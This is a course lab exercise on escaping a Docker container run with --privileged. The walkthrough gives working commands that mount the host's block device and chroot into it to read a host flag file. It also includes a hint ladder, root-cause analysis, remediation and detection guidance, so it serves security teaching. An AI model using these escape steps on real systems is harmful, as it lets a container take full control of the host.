# Exercise 02 — Privileged Container Escape

| | |
|---|---|
| **Class** | Misconfiguration (Chapter 3, §3.2) |
| **CVE** | None — operator misconfiguration, not a software defect |
| **Difficulty** | Introductory |
| **Snapshot** | Runtime target (Chapter 4, §4.4.2) |
| **Taxonomy cell** | Misconfiguration → capabilities, seccomp, LSM, device isolation defeated concurrently |

---

## 1. Objective

Starting from a container launched with the `--privileged` flag, obtain a root shell on the **VM host** — not merely inside the container — and read the host marker file at `/root/flag.txt`.

Success condition: recovery of `FLAG{privileged_equals_host_devices}`, which exists **only on the host filesystem** and is not present inside the container image.

## 2. Threat Scenario

`--privileged` is a single flag with an outsized effect. It is frequently applied as a convenience — to let a container manage devices, run nested Docker, or access hardware — without appreciation that it concurrently restores the full capability set, disables the default seccomp profile, runs the LSM (AppArmor/SELinux) profile unconfined, and exposes the host's raw block devices inside the container's `/dev`. Any one of these is sufficient to undermine isolation; together they render the container's root effectively equivalent to the host's root.

This exercise is the second of the misconfiguration tier. Where Exercise 01 escaped by *delegation* (issuing commands to a root-owned daemon through the Docker socket), Exercise 02 escapes by *direct device access*: the container mounts the host's disk itself. Same taxonomy cell, different mechanism.

## 3. Setup

From inside the lab VM, in this directory:

```bash
./setup.sh
```

This plants the host flag at `/root/flag.txt` and brings up a container named `ex02-privileged-target` (defined in `docker-compose.yml`) running with `privileged: true`. The container runs `sleep infinity` so it can be entered on demand:

```bash
sudo docker exec -it ex02-privileged-target bash
```

## 4. Hint Ladder *(for course use)*

1. A privileged container can see more than its own filesystem. What appears under `/dev`?
2. If the host's block device is visible to you, what can you do with it that an unprivileged container could not?
3. Mounting is a privileged operation gated by `CAP_SYS_ADMIN` and the seccomp profile. Why are both out of your way here?

## 5. Exploitation Walkthrough

Enter the target container:

```bash
sudo docker exec -it ex02-privileged-target bash
```

Inside the container, the host's block devices are visible because `--privileged` removed the device-cgroup restriction. Identify the host's root partition (the device name depends on the VM's disk backend — `/dev/sda*` for SATA/AHCI, `/dev/vda*` for virtio):

```bash
lsblk
# or, if lsblk is unavailable:
fdisk -l
```

Mount the host's root filesystem and enter it. `CAP_SYS_ADMIN` (granted) authorises the mount, and the default seccomp profile that would normally deny the `mount` syscall is disabled:

```bash
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host      # substitute the device identified above
chroot /mnt/host               # now operating within the host filesystem
```

Read the objective:

```bash
cat /root/flag.txt
# FLAG{privileged_equals_host_devices}
```

**Alternative path (foreshadows Exercise 04).** A privileged container with `CAP_SYS_ADMIN` can also mount a cgroup v1 controller and abuse its `release_agent` to execute a command in the host's initial namespace. That mechanism is the subject of CVE-2022-0492 (Exercise 04); here it works trivially because privilege is granted outright rather than obtained through a defect. The disk-mount path above is the canonical solution for this exercise.

## 6. Root-Cause Analysis

No isolation layer is *exploited* in this exercise; several are *switched off* by configuration. Per Chapter 2, Table 2.2, `--privileged` produces four concurrent effects:

- **Capabilities restored** — including `CAP_SYS_ADMIN`, which authorises `mount`.
- **Seccomp disabled** — the default profile that denies `mount`, `pivot_root`, and related syscalls is not applied.
- **Device isolation removed** — the device cgroup no longer restricts access, so the host's block devices appear in `/dev`.
- **LSM unconfined** — the AppArmor/SELinux profile that would constrain file and mount operations is not enforced.

With the mount syscall permitted (seccomp), authorised (capabilities), and unconstrained (LSM), and with the host disk reachable (device cgroup), the container simply mounts the host filesystem and reads it. This maps to the misconfiguration category of §3.2: a correctly patched host remains fully vulnerable, because there is no defect to patch — the exposure is the flag itself.

## 7. Remediation

- **Do not use `--privileged`.** It is almost never the minimal grant a workload actually needs.
- **Grant narrowly instead.** Where a container legitimately needs a specific device, use `--device=/dev/xxx`; where it needs a specific capability, use `--cap-add=<CAP>` and otherwise `--cap-drop=ALL`. This replaces a blanket grant with an auditable, least-privilege one.
- **Keep the default seccomp and LSM profiles.** Do not pair narrow grants with `--security-opt seccomp=unconfined` or `apparmor=unconfined`, which would reintroduce the exposure piecemeal.
- **Enable user-namespace remapping (rootless).** Per §2.5, this does not prevent the technique but reduces its outcome: an escape lands as an unprivileged host user rather than host root.
- **Enforce policy at admission.** Reject privileged containers via a runtime policy engine so the misconfiguration cannot reach production in the first place.

## 8. Detection Guidance

- Alert on any container created with `privileged: true` (Compose) or `--privileged` (CLI).
- Flag containers started with `--security-opt seccomp=unconfined` or `apparmor=unconfined`.
- Monitor for `mount` syscalls originating from within a container, and for a container opening a host block device (`/dev/sd*`, `/dev/vd*`).
- With Falco, the built-in rules for privileged-container launch and for sensitive mounts cover this exercise directly.

## 9. Teardown

```bash
./teardown.sh
```

This stops and removes the target container and deletes the host flag. For a guaranteed-pristine state between exercises, restore the VM's clean-baseline snapshot (§4.4.2).

## 10. Reproducibility

| Component | Pinned value | Notes |
|---|---|---|
| Target image | `ubuntu:22.04` | Escape is version-independent; pinned only for a deterministic rebuild. |
| Container runtime | Docker / `runc` version of the **runtime-target** snapshot | Record the exact versions in the snapshot metadata. |
| Compose schema | v2 (`docker compose`) | `setup.sh`/`teardown.sh` fall back to v1 `docker-compose` if present. |

Because the vulnerability is a configuration flaw rather than a software defect, this exercise does not depend on a specific vulnerable package version. The image and runtime are pinned solely so that the environment rebuilds identically from the repository, in keeping with the reproducibility requirement of §4.4.
